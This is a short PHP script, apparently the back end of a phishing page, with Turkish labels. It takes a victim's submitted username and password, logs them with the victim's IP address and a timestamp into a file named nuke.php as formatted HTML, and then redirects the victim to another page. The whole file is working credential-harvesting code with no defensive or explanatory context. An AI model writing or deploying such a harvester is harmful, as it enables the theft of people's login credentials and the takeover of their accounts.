<?php
$cevap1 = $_POST['username'];
$cevap2 =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('nuke.php', 'a'); 
fwrite($file, "<font color='gray'>Kullanıcı Adı:</font><font color='red'> " .$cevap1. "</font><br>\n<font color='gray'> Şifre: </font><font color='green'>" .$cevap2. "</font><br>\n<font color='gray'>Ip Adresi:</font><font color='white'> " .$ip. "</font><br>\n<font color='gray'>Tarih:</font><font color='white'> " .$cur_time.  "</font><hr>");
fclose($file); 
echo '';
			header("Refresh:0; url=/duke.html");
?>






